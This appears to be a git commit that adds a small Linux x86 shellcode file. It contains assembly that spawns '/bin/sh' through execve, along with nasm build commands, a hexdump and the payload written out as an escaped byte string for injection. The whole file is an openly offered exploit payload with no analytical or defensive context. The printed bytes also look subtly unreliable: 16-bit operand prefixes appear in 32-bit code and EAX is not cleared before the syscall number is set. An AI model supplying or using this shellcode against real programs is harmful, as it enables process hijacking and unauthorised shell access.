2a55cfc6fc8b5ed67813fb491c752c29d27c51bc
tuz358 <orca00358@gmail.com>
2017-11-09 06:22:48 -0800

    first commit

---
+++ linux_x86/shellcode.asm
@@ -0,0 +1,31 @@
+; Linux x86 shellcode - 24 byte
+;
+; $ nasm shellcode.asm
+; $ wc -c shellcode
+; 24 shellcode 
+; $ hexdump -C shellcode
+; 00000000  eb 0c 66 5b b0 0b 66 31  c9 66 31 d2 cd 80 e8 f1  |..f[..f1.f1.....|
+; 00000010  ff 2f 62 69 6e 2f 73 68                           |./bin/sh|
+; 00000018
+; $ nasm -f elf shellcode.asm
+; $ ld -s -o shellcode shellcode.o
+; $ ./shellcode
+;
+; shellcode = "\xeb\x0c\x66\x5b\xb0\x0b\x66\x31\xc9\x66\x31\xd2\xcd\x80\xe8\xf1\xff\x2f\x62\x69\x6e\x2f\x73\x68";
+
+section	.text
+global	_start
+
+_start:
+	jmp short two
+
+one:
+	pop ebx
+	mov al, 0x0b
+	xor ecx, ecx
+	xor edx, edx
+	int 0x80
+
+two:
+	call one
+	db "/bin/sh"
